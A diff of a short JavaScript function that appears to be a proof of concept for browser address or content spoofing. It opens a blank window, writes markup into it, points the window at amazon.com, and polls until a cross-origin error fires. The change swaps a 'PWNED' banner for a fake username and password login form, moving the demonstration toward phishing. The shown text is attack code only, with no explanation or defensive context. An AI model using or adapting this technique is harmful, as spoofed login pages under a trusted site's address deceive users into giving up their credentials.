@@ -5,7 +5,10 @@
 
   function f() {
     w = window.open("");
-    w.document.write('<h1>PWNED BY FUFUFAFA</h1>');
+    w.document.write(`<h1>This is not Mozilla</h1>
+<input type="text" placeholder="Username" id="username"><br>
+<input type="password" placeholder="Password" id="password"><br>
+<button action="#" method="post">Click me</button>`);
     w.location = "http://amazon.com";
     i = setInterval("try { x = w.location.href; } catch(e) { clearInterval(i); next(); }", 1); 
   }
